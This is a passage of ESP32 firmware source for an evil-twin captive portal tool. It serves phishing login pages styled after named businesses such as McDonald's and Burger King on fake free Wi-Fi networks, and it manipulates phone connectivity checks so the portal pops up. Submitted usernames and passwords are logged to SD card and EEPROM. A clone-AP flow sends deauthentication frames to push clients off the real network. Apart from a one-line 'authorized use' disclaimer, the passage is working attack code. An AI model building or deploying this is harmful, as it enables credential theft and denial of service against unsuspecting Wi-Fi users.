    }
    memcpy(s_pageNames[j + 1], k, CP_PAGE_NAME_LEN);
  }

  s_pageSourceCount = (uint8_t)(1 + n);
  Serial.printf("[SD] %u pagina(s) no cartao\n", (unsigned)n);
  for (uint8_t i = 0; i < n; i++) {
    char p[56];
    cpPagePathFor((uint8_t)(i + 1), p, sizeof(p));
    Serial.printf("[SD]   SD %s  ->  %s\n", s_pageNames[i], p);
  }
}

// Rotulo da fonte atual, usado no menu e no startAttack.
static String cpPageSourceLabel() {
  if (s_pageSourceIdx == 0 || s_pageSourceIdx >= s_pageSourceCount) return String("Local");
  return String("SD ") + String(s_pageNames[s_pageSourceIdx - 1]);
}

// --- nome da rede ------------------------------------------------------------
// Cada pagina tem um nome padrao: BK e McD tem os seus, as outras usam
// "<pagina> WiFi Gratis" e a generica (Local) usa "WiFi Gratis".
static bool cpEqNoCase(const char* a, const char* b) {
  while (*a && *b) {
    char ca = *a, cb = *b;
    if (ca >= 'A' && ca <= 'Z') ca = (char)(ca + 32);
    if (cb >= 'A' && cb <= 'Z') cb = (char)(cb + 32);
    if (ca != cb) return false;
    a++; b++;
  }
  return *a == '\0' && *b == '\0';
}

// Cria /captive_portal/ssid.txt na primeira vez, ja com uma linha por pagina
// encontrada, para o usuario so precisar editar os valores.
static void cpSeedSsidMap() {
  if (!cpMountSD()) return;
  if (SD.exists(kCpSsidMapPath)) return;

  File f = SD.open(kCpSsidMapPath, "w");
  if (!f) {
    Serial.println("[SD] nao consegui criar ssid.txt");
    return;
  }
  f.print("# Nome da rede Wi-Fi de cada pagina do portal\r\n");
  f.print("# Formato:  <arquivo sem .html>=<nome da rede>\r\n");
  f.print("# Edite a vontade. Linhas comecando com # sao ignoradas.\r\n");
  f.print("# \"Local\" e a pagina generica embutida no firmware.\r\n");
  f.print("\r\n");
  f.printf("Local=%s\r\n", s_stdNameLocal);
  for (uint8_t i = 0; i + 1 < s_pageSourceCount && i < CP_MAX_SD_PAGES; i++) {
    f.printf("%s=%s WiFi Gratis\r\n", s_pageNames[i], s_pageNames[i]);
  }
  f.close();
  Serial.println("[SD] criado /captive_portal/ssid.txt (edite os nomes)");
}

// Le o mapa do cartao. Sem o arquivo, vale o padrao embutido.
static void cpLoadSsidMap() {
  s_nameMapCount = 0;
  snprintf(s_stdNameLocal, sizeof(s_stdNameLocal), "WiFi Gratis");

  if (!cpMountSD()) return;
  File f = SD.open(kCpSsidMapPath, FILE_READ);
  if (!f) {
    Serial.println("[SD] ssid.txt ausente: usando \"<pagina> WiFi Gratis\"");
    return;
  }

  while (f.available()) {
    String line = f.readStringUntil('\n');
    line.trim();
    if (line.length() == 0 || line[0] == '#') continue;

    int eq = line.indexOf('=');
    if (eq <= 0) continue;
    String k = line.substring(0, eq);  k.trim();
    String v = line.substring(eq + 1); v.trim();
    if (k.length() == 0 || v.length() == 0) continue;

    if (cpEqNoCase(k.c_str(), "Local")) {
      v.toCharArray(s_stdNameLocal, sizeof(s_stdNameLocal));
      continue;
    }
    if (s_nameMapCount >= CP_MAX_NAME_MAP) continue;
    k.toCharArray(s_nameMap[s_nameMapCount].key, CP_PAGE_NAME_LEN);
    v.toCharArray(s_nameMap[s_nameMapCount].ssid, CP_SSID_NAME_LEN);
    s_nameMapCount++;
  }
  f.close();
  Serial.printf("[SD] ssid.txt: Local=\"%s\" + %u pagina(s)\n",
                s_stdNameLocal, (unsigned)s_nameMapCount);
}

// Nome padrao da pagina atual: vem do ssid.txt; se nao estiver la, deriva do arquivo.
static void cpStdSsidForPage(char* out, size_t n) {
  if (s_pageSourceIdx == 0 || s_pageSourceIdx >= s_pageSourceCount) {
    snprintf(out, n, "%s", s_stdNameLocal);
    return;
  }
  const char* nm = s_pageNames[s_pageSourceIdx - 1];
  for (uint8_t i = 0; i < s_nameMapCount; i++) {
    if (cpEqNoCase(s_nameMap[i].key, nm)) {
      snprintf(out, n, "%s", s_nameMap[i].ssid);
      return;
    }
  }
  snprintf(out, n, "%s WiFi Gratis", nm);
}

static String cpEepromReadString(int addr, int maxLen) {
  String s;
  for (int i = 0; i < maxLen; i++) {
    char c = (char)EEPROM.read(addr + i);
    if (c == '\0') break;
    s += c;
  }
  return s;
}

static void cpEepromWriteString(int addr, const String& s, int maxLen) {
  for (int i = 0; i < maxLen; i++) {
    EEPROM.write(addr + i, i < (int)s.length() ? (uint8_t)s[i] : 0);
  }
}

// Coloca em custom_ssid o nome da origem escolhida (Std / Custom / Clone).
static void cpApplySsidSource(bool persist) {
  char stdName[48];
  cpStdSsidForPage(stdName, sizeof(stdName));

  String s;
  if (s_ssidSrc == 1)      s = cpEepromReadString(CUSTOM_SSID_ADDR, 32);
  else if (s_ssidSrc == 2) s = cpEepromReadString(CLONE_SSID_ADDR, 32);
  if (s.length() == 0)     s = String(stdName);
  if (s.length() == 0)     s = String(default_ssid);
  if (s.length() > 31)     s = s.substring(0, 31);

  s.toCharArray(custom_ssid, 32);
  if (persist) {
    cpEepromWriteString(SSID_ADDR, s, 32);
    EEPROM.commit();
  }
}

static const char kCpReadmeText[] = R"RDME(ESP32-DIV - Captive Portal: paginas por local
=========================================================

COMO FUNCIONA
-------------
O firmware traz UMA pagina generica de "Wi-Fi Gratis" embutida (a opcao
"Local"). As paginas personalizadas de cada lugar ficam no cartao SD.

O NOME DO ARQUIVO E O NOME DO LOCAL no menu. Exemplos:

  /captive_portal/McD.html   -> aparece como "SD McD"
  /captive_portal/BK.html    -> aparece como "SD BK"
  /captive_portal/Cafe.html  -> aparece como "SD Cafe"

O menu "Page" cicla entre "Local" e cada .html que encontrar na pasta
(ate 8). A escolha fica salva no EEPROM. Se o cartao faltar, ou o arquivo
nao existir, o firmware cai na pagina generica - o portal nunca fica sem
pagina.

Use nomes CURTOS (McD, BK, Cafe): o menu do aparelho tem pouca largura.

ARQUIVOS
--------
  /captive_portal/<local>.html   uma pagina por local (ex.: McD.html, BK.html)
  /captive_portal/ssid.txt       nome da rede Wi-Fi de cada pagina
  /captive_portal/README.txt     este arquivo

NOME DA REDE (ssid.txt)
-----------------------
O nome padrao do Wi-Fi de cada pagina fica em /captive_portal/ssid.txt,
uma linha por pagina, no formato <arquivo sem .html>=<nome da rede>:

    Local=WiFi Gratis
    McD=McD WiFi Gratis
    BK=BK WiFi Gratis
    Madero=Madero WiFi Gratis

- "Local" e a pagina generica embutida no firmware.
- Pagina que nao estiver no arquivo usa "<nome do arquivo> WiFi Gratis".
- Linhas comecando com # sao ignoradas.
- Se o arquivo faltar, o firmware cria um modelo na primeira vez.
- Para mudar o nome no aparelho sem editar o cartao, use Config > SSID Custom.

Todas as paginas tem a MESMA ESTRUTURA (as 9 telas, os 5 botoes de login,
os termos, o botao voltar, as validacoes). O que muda por local e so a
identidade: paleta, fonte, logotipos e os textos que citam o lugar.

COMO ADICIONAR UM LOCAL
-----------------------
1. Copie uma das paginas (ex.: BK.html) para /captive_portal/Cafe.html
2. Abra no PC e troque as cores, a fonte e os logotipos
3. Salve, recoloque o cartao e ligue o aparelho
Nao precisa recompilar nada.

CONTRATO OBRIGATORIO (para os dados digitados serem registrados)
---------------------------------------------------------------
 1. Formulario que faz POST para /login :
        <form action='/login' method='POST'> ... </form>
 2. Campo de senha com name="password" :
        <input type='password' name='password'>
 3. Campo de usuario com name="username" (oculto ou visivel)
 4. Campo name="provider" com o nome do botao (google/facebook/...)
 5. Um submit dentro do form

Se renomear os campos ou mudar o action, o dado NAO sera registrado.

ONDE OS DADOS FICAM
-------------------
Cada envio e gravado em:
  /captive_portal/captured.csv
Colunas: millis,provider,remote_ip,ssid,username,password

E tambem no EEPROM do aparelho (20 ultimas), exportaveis pelo menu
"Export" para /captive_portal/eeprom_dump.csv.

USO AUTORIZADO
--------------
Apenas em laboratorio/equipamentos proprios ou com autorizacao explicita,
para estudo e defesa. Nao use contra terceiros.
)RDME";

static bool cpWriteFileIfMissing(const char* path, const char* content) {
  if (!cpMountSD()) return false;
  if (SD.exists(path)) return true;          // never overwrite the user's edits
  File f = SD.open(path, "w");
  if (!f) {
    cp_sd_mounted = false;
    if (!cpMountSD()) return false;
    f = SD.open(path, "w");
    if (!f) return false;
  }
  f.print(content);
  f.flush();
  f.close();
  return true;
}

// Cria o LEIA-ME no cartao (primeira vez) e conta as paginas local_N.html.
static void cpSeedPortalFilesOnSD() {
  if (!cpEnsureDir("/captive_portal")) {
    Serial.println("[SD] /captive_portal unavailable; built-in portal page");
    return;
  }
  // A pagina embutida vive no firmware; aqui so criamos o LEIA-ME.
  cpWriteFileIfMissing(kCpReadmePath, kCpReadmeText);
  cpScanSDPages();
}

// --- servir a pagina do portal ----------------------------------------------
// A pagina embutida vai direto da flash (send_P), sem copia na RAM; a versao
// do SD e enviada em streaming. Sem isso, ~56 KB de heap ficavam presos e o
// lwIP/WiFi nao tinha folga para os buffers de pacote - o celular conectava e
// a pagina nao carregava.
static void cpLogHeap(const char* where) {
  Serial.printf("[heap] %-26s livre=%u  maior_bloco=%u\n",
                where, (unsigned)ESP.getFreeHeap(), (unsigned)ESP.getMaxAllocHeap());
}

static void cpSendPortalPage() {
  if (s_pageSourceIdx > 0 && s_pageSourceIdx < s_pageSourceCount) {
    char p[48];
    cpPagePathFor(s_pageSourceIdx, p, sizeof(p));
    if (cpMountSD() && SD.exists(p)) {
      File f = SD.open(p, FILE_READ);
      if (f) {
        Serial.printf("[portal] %s em streaming (%u bytes)\n", p, (unsigned)f.size());
        server.streamFile(f, "text/html");
        f.close();
        return;
      }
    }
    Serial.printf("[portal] %s indisponivel; usando a pagina Local\n", p);
  }
  server.send_P(200, "text/html", kBuiltinLoginPage);
}

static bool cpDumpAllCredentialsToSD(int* outCount) {
  if (outCount) *outCount = 0;
  const char* dir  = "/captive_portal";
  const char* path = "/captive_portal/eeprom_dump.csv";
  if (!cpEnsureDir(dir)) return false;

  int count = EEPROM.read(COUNT_ADDR);
  if (count < 0) count = 0;
  if (count > MAX_CREDS) count = MAX_CREDS;

  File f = SD.open(path, "w");
  if (!f) {
    cp_sd_mounted = false;
    if (!cpMountSD()) return false;
    f = SD.open(path, "w");
    if (!f) return false;
  }

  f.print("index,provider,ssid,username,password\r\n");
  for (int i = 0; i < count; i++) {
    Credential cred;
    EEPROM.get(CRED_ADDR + (i * CRED_SIZE), cred);
    String line;
    line.reserve(48 + strlen(cred.ssid) + strlen(cred.username) + strlen(cred.password));
    line += String(i);
    line += ",";
    line += cpCsvEscape(String(cred.provider));
    line += ",";
    line += cpCsvEscape(String(cred.ssid));
    line += ",";
    line += cpCsvEscape(String(cred.username));
    line += ",";
    line += cpCsvEscape(String(cred.password));
    line += "\r\n";
    f.print(line);
  }
  f.flush();
  f.close();
  if (outCount) *outCount = count;
  return true;
}

static void cpCredListStatus(const String& msg, uint16_t color) {
  const int y = max(50, wifiContentBottom() - 16);
  tft.fillRect(0, y, 240, 16, TFT_BLACK);
  tft.setTextColor(color, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(2, y + 4);
  tft.print(msg);
}

static void cpStartDeauth(const String& ssid, const uint8_t* bssid, uint8_t channel) {
  if (cp_deauth_active) return;

  memset(&cp_target_ap, 0, sizeof(cp_target_ap));
  strcpy((char*)cp_target_ap.ssid, ssid.c_str());
  memcpy(cp_target_ap.bssid, bssid, 6);
  cp_target_ap.primary = channel;
  cp_target_channel = channel;

  cp_deauth_active = true;
  cp_deauth_packet_count = 0;
  cp_deauth_success_count = 0;
  cp_last_deauth_time = 0;

  Serial.printf("[CP Deauth] Starting deauth against cloned AP: %s CH=%u\n", ssid.c_str(), channel);
}

static void cpStopDeauth() {
  if (!cp_deauth_active) return;

  cp_deauth_active = false;
  Serial.printf("[CP Deauth] Stopped deauth (packets: %u, success: %u)\n",
                (unsigned)cp_deauth_packet_count, (unsigned)cp_deauth_success_count);
}

static void cpSendDeauthFrame() {
  if (!cp_deauth_active) return;

  esp_wifi_set_channel(cp_target_channel, WIFI_SECOND_CHAN_NONE);

  memcpy(cp_deauth_frame, cp_deauth_frame_default, 26);
  memcpy(&cp_deauth_frame[10], cp_target_ap.bssid, 6);
  memcpy(&cp_deauth_frame[16], cp_target_ap.bssid, 6);
  Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, 26);

  memcpy(cp_deauth_frame, cp_deauth_frame_default, 26);
  memcpy(&cp_deauth_frame[10], cp_target_ap.bssid, 6);
  memcpy(&cp_deauth_frame[16], cp_target_ap.bssid, 6);

  memset(&cp_deauth_frame[4], 0xFF, 6);
  Deauther::wsl_bypasser_send_raw_frame(cp_deauth_frame, 26);

  cp_deauth_packet_count += 2;
}

static void handleGenerate204() {
  Serial.println("Android /generate_204 requested");
  displayPrint("Android /generate_204 requested", GREEN, false);
  server.sendHeader("Location", "/login.html", true);
  server.send(302, "text/plain", "");
}

static void handleHotspotDetect() {
  Serial.println("iOS /hotspot-detect.html requested");
  displayPrint("iOS /hotspot-detect.html requested", GREEN, false);
  // Resposta diferente de "Success" faz o iOS abrir a folha do captive portal.
  cpSendPortalPage();
}

static void handleCaptiveApple() {
  Serial.println("iOS /captive.apple.com requested");
  displayPrint("iOS /captive.apple.com requested", GREEN, false);
  // NAO responder "Success" aqui: essa string diz ao iOS "a internet funciona",
  // e ele entao nao mostra a pagina do portal. Servimos a pagina do portal.
  cpSendPortalPage();
}

static void handleNCSITxt() {
  Serial.println("Windows /ncsi.txt requested");
  displayPrint("Windows /ncsi.txt requested", GREEN, false);
  server.send(200, "text/plain", "Microsoft NCSI");
}

static void handleConnectTestTxt() {
  Serial.println("Windows /connecttest.txt requested");
  displayPrint("Windows /connecttest.txt requested", GREEN, false);
  server.send(200, "text/plain", "Microsoft Connect Test");
}

static void handleLoginPage() {
  Serial.println("Login page (/login.html) requested");
  displayPrint("Login page (/login.html) requested", GREEN, false);
  cpSendPortalPage();
}

static void handleRoot() {
  Serial.println("Root (/) requested");
  displayPrint("Root (/) requested", GREEN, false);
  cpSendPortalPage();
}

static void handleLoginPost() {
  String username = server.arg("username");
  String password = server.arg("password");
  String provider = server.arg("provider");
  provider.trim();
  if (provider.length() == 0) provider = "desconhecido";
  String remoteIp = server.client().remoteIP().toString();
  Serial.println("Captured Credentials:");
  Serial.println("Provider: " + provider);
  Serial.println("Username: " + username);
  Serial.println("Password: " + password);
  Serial.println("SSID: " + String(custom_ssid));
  saveCredential(username, password, custom_ssid, provider);
  if (cpAppendCaptureToSD(remoteIp, username, password, String(custom_ssid), provider)) {
    Serial.println("[SD] Captive capture appended to /captive_portal/captured.csv");
  } else {
    Serial.println("[SD] Captive capture export failed (SD not mounted / write error)");
  }
  server.send(200, "text/html", "<!DOCTYPE html><html lang='pt-BR'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'><title>Conectado - McWi-Fi</title><style>body{font-family:Arial,sans-serif;background:#F8F0E7;color:#27251F;text-align:center;padding:40px 20px}h1{color:#DA291C}</style></head><body><h1>Conectado!</h1><p>Você está conectado ao McWi-Fi. Aproveite a internet.</p></body></html>");
}

static void handleNotFound() {
  Serial.println("Not found: " + server.uri());
  server.sendHeader("Location", "/login.html", true);
  server.send(302, "text/plain", "");
}

void setupWebServer() {
  server.on("/generate_204", HTTP_GET, static_cast<void (*)()>(handleGenerate204));
  server.on("/hotspot-detect.html", HTTP_GET, static_cast<void (*)()>(handleHotspotDetect));
  server.on("/captive.apple.com", HTTP_GET, static_cast<void (*)()>(handleCaptiveApple));
  server.on("/ncsi.txt", HTTP_GET, static_cast<void (*)()>(handleNCSITxt));
  server.on("/connecttest.txt", HTTP_GET, static_cast<void (*)()>(handleConnectTestTxt));
  server.on("/login.html", HTTP_GET, static_cast<void (*)()>(handleLoginPage));
  server.on("/", HTTP_GET, static_cast<void (*)()>(handleRoot));
  server.on("/login", HTTP_POST, static_cast<void (*)()>(handleLoginPost));
  server.onNotFound(static_cast<void (*)()>(handleNotFound));
}

void loadSSID() {
  String savedSSID = "";
  for (int i = 0; i < 32; i++) {
    char c = EEPROM.read(SSID_ADDR + i);
    if (c == 0) break;
    savedSSID += c;
  }
  if (savedSSID.length() > 0) {
    savedSSID.toCharArray(custom_ssid, 32);
  } else {
    strcpy(custom_ssid, default_ssid);
  }
}

void saveSSID(String ssid) {
  for (int i = 0; i < 32; i++) {
    if (i < ssid.length()) {
      EEPROM.write(SSID_ADDR + i, ssid[i]);
    } else {
      EEPROM.write(SSID_ADDR + i, 0);
    }
  }
  EEPROM.commit();
  ssid.toCharArray(custom_ssid, 32);
  if (attackActive) {
    WiFi.softAPdisconnect(true);
    WiFi.softAP(custom_ssid, password, ap_channel);
    Serial.println("New SSID set: " + String(custom_ssid));
  }
}

void deleteCredential(int index) {
  int count = EEPROM.read(COUNT_ADDR);
  if (index < 0 || index >= count) {
    Serial.println("Invalid credential index: " + String(index));
    return;
  }

  for (int i = index; i < count - 1; i++) {
    Credential cred;
    EEPROM.get(CRED_ADDR + ((i + 1) * CRED_SIZE), cred);
    EEPROM.put(CRED_ADDR + (i * CRED_SIZE), cred);
  }

  count--;
  EEPROM.write(COUNT_ADDR, count);
  EEPROM.commit();
  Serial.println("Credential deleted at index " + String(index));
  Serial.printf("New credential count: %d\n", count);
}

void clearAllCredentials() {
  EEPROM.put(COUNT_ADDR, (uint32_t)0);

  int endAddr = CRED_ADDR + (MAX_CREDS * CRED_SIZE);
  if (endAddr > COUNT_ADDR) {
    Serial.println("Error: Credential clear would overwrite counter!");
    endAddr = COUNT_ADDR;
  }
  for (int i = CRED_ADDR; i < endAddr; i++) {
    EEPROM.write(i, 0);
  }
  EEPROM.commit();
  Serial.println("All credentials cleared from " + String(CRED_ADDR) + " to " + String(endAddr - 1));
}

static void cpDrawCloneFrame(const char* title, const char* subtitle = nullptr) {
  tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
  wifiClearBody(TFT_BLACK);
  tft.setTextSize(1);
  const int headerY = cpCloneHeaderY();
  tft.setTextColor(UI_TEXT, TFT_BLACK);
  tft.setCursor(8, headerY);
  tft.println(title);
  if (subtitle && subtitle[0]) {
    tft.setTextColor(WHITE, TFT_BLACK);
    tft.setCursor(8, headerY + 12);
    tft.println(subtitle);
  }
}

static void cpCloneResetListRenderState() {
  s_cloneLastRenderedPage = -1;
  s_cloneLastRenderedSel = -1;
  s_cloneLastPrevEn = false;
  s_cloneLastNextEn = false;
}

static void cpCloneDrawListHeader(int count, int page, int totalPages) {
  const int headerY = cpCloneHeaderY();
  tft.setTextColor(UI_TEXT, TFT_BLACK);
  tft.setCursor(8, headerY);
  tft.print("Clone Access Point");
  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setCursor(8, headerY + 12);
  tft.printf("Found %d network%s", count, count == 1 ? "" : "s");
  tft.setTextColor(UI_TEXT, TFT_BLACK);
  tft.setCursor(170, headerY);
  tft.printf("%d/%d", page + 1, totalPages);
}

static void cpCloneDrawListHint() {
  tft.setTextColor(UI_TEXT, TFT_BLACK);
  tft.setCursor(8, wifiListBottomY() - CP_CLONE_HINT_H);
  tft.print("Tap row or Pick to clone");
}

static void cpCloneDrawRow(int displayNum, const String& ssid, int rssi, int ch,
                           uint8_t auth, int y, bool selected) {
  char ssidBuf[16];
  if (ssid.length() == 0) {
    strncpy(ssidBuf, "<hidden>", sizeof(ssidBuf));
  } else {
    strncpy(ssidBuf, ssid.c_str(), 11);
    ssidBuf[11] = '\0';
    if (ssid.length() > 11) {
      strcat(ssidBuf, "...");
    }
  }

  const char* enc = (auth == WIFI_AUTH_OPEN) ? "OPEN" : "WPA2";
  char buf[64];
  snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s",
           displayNum, ssidBuf, rssi, ch, enc);

  tft.fillRect(0, y, tft.width(), CP_CLONE_ROW_H, TFT_BLACK);
  tft.setCursor(2, y);
  tft.setTextColor(selected ? FEATURE_TEXT : FEATURE_BG, TFT_BLACK);
  tft.print(selected ? ">" : " ");
  tft.setCursor(10, y);
  const bool openNet = (auth == WIFI_AUTH_OPEN);
  tft.setTextColor(selected ? FEATURE_TEXT : (openNet ? FEATURE_TEXT : WHITE), TFT_BLACK);
  tft.println(buf);
}

static void cpCloneDrawRowAt(int rowIdx, int sortedIdx, const int* idx, int y, bool selected) {
  const int real = idx[sortedIdx];
  cpCloneDrawRow(rowIdx + 1, WiFi.SSID(real), WiFi.RSSI(real), WiFi.channel(real),
                 WiFi.encryptionType(real), y, selected);
}

static void cpCloneDrawNetworkList(int count, const int* idx, int selectedIdx, bool forceFull) {
  const int rowsPerPage = cpCloneRowsPerPage();
  const int page = selectedIdx / rowsPerPage;
  const int totalPages = max(1, (count + rowsPerPage - 1) / rowsPerPage);
  const int start = page * rowsPerPage;
  const int end = min(start + rowsPerPage, count);
  const int firstRowY = cpCloneFirstRowY();

  const bool pageChanged = (page != s_cloneLastRenderedPage);
  const bool needFull = forceFull || pageChanged || s_cloneLastRenderedSel < 0;

  if (needFull) {
    tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
    wifiClearBody(TFT_BLACK);
    tft.setTextSize(1);
    cpCloneDrawListHeader(count, page, totalPages);

    int y = firstRowY;
    for (int row = start; row < end && y + CP_CLONE_ROW_H <= cpCloneListAreaBottom(); row++) {
      cpCloneDrawRowAt(row, row, idx, y, row == selectedIdx);
      y += CP_CLONE_ROW_H;
    }
    cpCloneDrawListHint();
    s_cloneLastRenderedPage = page;
    s_cloneLastRenderedSel = selectedIdx;
    return;
  }

  if (s_cloneLastRenderedSel != selectedIdx) {
    const int prev = s_cloneLastRenderedSel;
    const int now = selectedIdx;

    if (prev >= start && prev < end) {
      const int y = firstRowY + (prev - start) * CP_CLONE_ROW_H;
      cpCloneDrawRowAt(prev, prev, idx, y, false);
    }
    if (now >= start && now < end) {
      const int y = firstRowY + (now - start) * CP_CLONE_ROW_H;
      cpCloneDrawRowAt(now, now, idx, y, true);
    }
    s_cloneLastRenderedSel = selectedIdx;
  }
}

static void cpCloneDrawScanning() {
  cpDrawCloneFrame("Scanning...", "Looking for nearby APs");
  loading(100, UI_WARN, 0, 0, 3, true);
}

static void cpCloneDrawEmpty() {
  cpDrawCloneFrame("No networks found", "Press Scan to retry or Back to cancel");
}

static void cpCloneEndUi() {
  s_cloneUiActive = false;
  s_clonePickMode = false;
  cpCloneResetListRenderState();
  cportalUpdateNavLabels();
}

static void cpCloneWaitNavRelease() {
  while (isButtonPressed(BTN_UP) || isButtonPressed(BTN_DOWN) || isButtonPressed(BTN_RIGHT)) {
    delay(10);
  }
  delay(cportalDebounceMs);
}

static void cportalWaitButtonRelease(int pin) {
  while (isButtonPressed(pin)) {
    delay(10);
  }
  delay(cportalDebounceMs);
}

static CpCloneAction cpCloneWaitInput(bool prevEnabled, bool nextEnabled, bool pickMode,
                                      int& tx, int& ty) {
  tx = ty = -1;
  while (true) {
    if (feature_exit_requested) {
      return CpCloneAction::Exit;
    }

    if (featureHasTouchNavBar()) {
      maintainTouchNavBar();
      tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
      if (isButtonPressedEdge(BTN_LEFT)) {
        return CpCloneAction::Back;
      }
      if (isButtonPressedEdge(BTN_DOWN)) {
        if (pickMode) {
          if (nextEnabled) {
            return CpCloneAction::Next;
          }
        } else {
          return CpCloneAction::Rescan;
        }
      }
      if (isButtonPressedEdge(BTN_UP) && prevEnabled) {
        return CpCloneAction::Prev;
      }
      if (isButtonPressedEdge(BTN_SELECT) && pickMode) {
        return CpCloneAction::Pick;
      }
      if (readTouchXY(tx, ty) && ty >= cpCloneFirstRowY() && ty < cpCloneListAreaBottom()) {
        delay(200);
        return CpCloneAction::ListTap;
      }
      delay(20);
      continue;
    }

    if (!readTouchXY(tx, ty)) {
      delay(10);
      continue;
    }
    delay(200);

    const int footerY = tft.height() - FeatureUI::FOOTER_H;
    if (ty >= footerY) {
      if (tx < 60) {
        return CpCloneAction::Back;
      }
      if (tx < 120) {
        return pickMode ? CpCloneAction::Pick : CpCloneAction::Rescan;
      }
      if (tx < 180 && prevEnabled) {
        return CpCloneAction::Prev;
      }
      if (tx >= 180 && nextEnabled) {
        return CpCloneAction::Next;
      }
      continue;
    }
    if (ty >= cpCloneFirstRowY() && ty < cpCloneListAreaBottom()) {
      return CpCloneAction::ListTap;
    }
  }
}

static void cpDrawCloneFooter(bool prevEnabled, bool nextEnabled, bool pickMode = false) {
  s_clonePrevEn = prevEnabled;
  s_cloneNextEn = nextEnabled;
  s_clonePickMode = pickMode;
  if (featureHasTouchNavBar()) {
    setTouchNavLabels("Back",
                      pickMode ? (nextEnabled ? "Next" : nullptr) : "Scan",
                      pickMode ? "Pick" : nullptr,
                      prevEnabled ? "Prev" : nullptr,
                      nullptr);
    redrawTouchButtonBar();
    return;
  }

  FeatureUI::drawFooterBg();

  FeatureUI::Button btns[4];

  FeatureUI::layoutFooter4(
    btns,
    "Back", FeatureUI::ButtonStyle::Secondary,
    pickMode ? "Pick" : "Scan", FeatureUI::ButtonStyle::Secondary,
    "Prev", FeatureUI::ButtonStyle::Secondary,
    "Next", FeatureUI::ButtonStyle::Secondary,
    false, false, !prevEnabled, !nextEnabled
  );

  for (int i = 0; i < 4; ++i) {
    FeatureUI::drawButtonRect(btns[i].x, btns[i].y, btns[i].w, btns[i].h,
                              btns[i].label, btns[i].style,
                              false, btns[i].disabled,
                              1);
  }
}

static bool cpCloneFillSelection(int sortedIdx, const int* idx, int count,
                                 String& outSsid, uint8_t& outChannel, uint8_t outBssid[6]) {
  if (sortedIdx < 0 || sortedIdx >= count) {
    return false;
  }
  const int real = idx[sortedIdx];
  outSsid = WiFi.SSID(real);
  outChannel = (uint8_t)WiFi.channel(real);
  memcpy(outBssid, WiFi.BSSID(real), 6);
  return true;
}

static bool cpCloneScanAndSelect(String& outSsid, uint8_t& outChannel, uint8_t outBssid[6]) {
  const int MAX_RESULTS = 40;

  s_cloneUiActive = true;
  cportalUpdateNavLabels();

  while (true) {
    cpCloneDrawScanning();

    WiFi.scanDelete();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(50);
    const uint32_t dwell = wifiStaScanMsPerChannel();
    int n = WiFi.scanNetworks(false, true, false, dwell);
    if (n <= 0) {
      cpCloneDrawEmpty();
      cpDrawCloneFooter(false, false, false);

      int tx = 0;
      int ty = 0;
      const CpCloneAction action = cpCloneWaitInput(false, false, false, tx, ty);
      if (action == CpCloneAction::Exit || action == CpCloneAction::Back) {
        cpCloneEndUi();
        return false;
      }
      if (action == CpCloneAction::Rescan) {
        continue;
      }
      continue;
    }

    int count = min(n, MAX_RESULTS);
    int idx[MAX_RESULTS];
    for (int i = 0; i < count; i++) idx[i] = i;

    for (int i = 0; i < count - 1; i++) {
      int best = i;
      for (int j = i + 1; j < count; j++) {
        if (WiFi.RSSI(idx[j]) > WiFi.RSSI(idx[best])) best = j;
      }
      if (best != i) {
        int tmp = idx[i];
        idx[i] = idx[best];
        idx[best] = tmp;
      }
    }

    int selectedIdx = 0;
    cpCloneResetListRenderState();
    bool listFullRedraw = true;
    while (true) {
      const bool prevEnabled = selectedIdx > 0;
      const bool nextEnabled = selectedIdx < count - 1;
      cpCloneDrawNetworkList(count, idx, selectedIdx, listFullRedraw);
      if (listFullRedraw || prevEnabled != s_cloneLastPrevEn || nextEnabled != s_cloneLastNextEn) {
        cpDrawCloneFooter(prevEnabled, nextEnabled, true);
        s_cloneLastPrevEn = prevEnabled;
        s_cloneLastNextEn = nextEnabled;
      }
      listFullRedraw = false;

      int tx = 0;
      int ty = 0;
      const CpCloneAction action = cpCloneWaitInput(prevEnabled, nextEnabled, true, tx, ty);
      if (action == CpCloneAction::Exit || action == CpCloneAction::Back) {
        cpCloneEndUi();
        return false;
      }
      if (action == CpCloneAction::Pick) {
        if (cpCloneFillSelection(selectedIdx, idx, count, outSsid, outChannel, outBssid)) {
          cpCloneEndUi();
          return true;
        }
        continue;
      }
      if (action == CpCloneAction::Prev && prevEnabled) {
        selectedIdx--;
        cpCloneWaitNavRelease();
        continue;
      }
      if (action == CpCloneAction::Next && nextEnabled) {
        selectedIdx++;
        cpCloneWaitNavRelease();
        continue;
      }
      if (action == CpCloneAction::ListTap) {
        const int rowsPerPage = cpCloneRowsPerPage();
        const int page = selectedIdx / rowsPerPage;
        const int start = page * rowsPerPage;
        const int firstRowY = cpCloneFirstRowY();
        const int clickedOffset = (ty - firstRowY) / CP_CLONE_ROW_H;
        const int absoluteRow = start + clickedOffset;
        if (absoluteRow >= start && absoluteRow < min(start + rowsPerPage, count)) {
          selectedIdx = absoluteRow;
          if (cpCloneFillSelection(selectedIdx, idx, count, outSsid, outChannel, outBssid)) {
            cpCloneEndUi();
            return true;
          }
        }
      }
    }
  }
}

static void cpCloneExistingAPFlow() {
  bool wasActive = attackActive;
  if (attackActive) stopAttack();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true);
  delay(100);

  String chosen;
  uint8_t ch = 1;
  uint8_t bssid[6] = {0};
  bool ok = cpCloneScanAndSelect(chosen, ch, bssid);
  WiFi.scanDelete();

  if (!ok) {
    if (wasActive) startAttack();
    drawMainMenu();
    return;
  }

  ap_channel = (ch == 0 ? 1 : ch);
  cpEepromWriteString(CLONE_SSID_ADDR, chosen, 32);
  s_ssidSrc = 2;
  EEPROM.write(SSID_SRC_ADDR, s_ssidSrc);
  EEPROM.commit();
  cpApplySsidSource(true);
  Serial.printf("[CP] Cloned AP: SSID='%s' CH=%u\n", custom_ssid, (unsigned)ap_channel);

  memset(&cp_target_ap, 0, sizeof(cp_target_ap));
  strcpy((char*)cp_target_ap.ssid, chosen.c_str());
  memcpy(cp_target_ap.bssid, bssid, 6);
  cp_target_ap.primary = ap_channel;

  cpStartDeauth(chosen, bssid, ap_channel);

  delay(500);

  startAttack();
  drawMainMenu();
}

static void cpEditSsid() {
